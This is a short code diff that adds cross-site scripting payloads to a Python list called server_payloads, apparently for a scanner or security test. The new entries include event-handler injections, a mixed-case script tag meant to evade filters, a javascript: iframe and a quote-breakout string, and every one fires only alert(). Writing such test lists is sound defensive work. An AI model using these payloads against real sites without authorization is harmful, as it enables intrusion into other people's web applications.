@@ -17,6 +17,12 @@ server_payloads = [
     "<script>alert('XSS-1')</script>",
     "<img src=x onerror=alert('XSS-2')>",
     "<h1>Vulnerable</h1>",
+    "<svg onmouseover=alert('XSS')>Hover me</svg>",
+    "<input onfocus=alert('XSS') autofocus>",
+    "<details open ontoggle=alert('XSS')>",
+    "<sCrIpt>alert('XSS')</sCRipt>",
+    f"<iframe src='javascript:alert('XSS')'></iframe>",
+    "'-alert('XSS')-'"
 ]
 
 
